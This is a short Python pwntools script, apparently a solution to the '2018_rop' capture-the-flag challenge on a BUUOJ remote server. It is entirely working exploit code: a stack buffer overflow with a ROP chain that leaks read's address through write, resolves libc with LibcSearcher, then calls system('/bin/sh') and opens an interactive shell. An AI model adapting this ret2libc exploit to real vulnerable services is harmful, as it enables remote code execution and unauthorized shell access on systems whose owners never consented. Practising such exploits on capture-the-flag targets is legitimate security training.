from pwn import *
from LibcSearcher import *

elf = ELF("./2018_rop")
context.arch = 'i386'
r = remote("node3.buuoj.cn", 29734)
r.sendline('a' * 0x8C + flat([elf.plt["write"], 0x8048474, 1, elf.got["read"], 4]))
read_addr = u32(r.recv(4))
libc = LibcSearcher("read", read_addr)
libc_base = read_addr-libc.dump("read")
system_addr=libc_base+libc.dump("system")
exit_addr=libc_base+libc.dump("exit")
bin_sh_addr=libc_base+libc.dump("str_bin_sh")
r.sendline('a'*0x8C+flat([system_addr,exit_addr,bin_sh_addr]))
r.interactive()
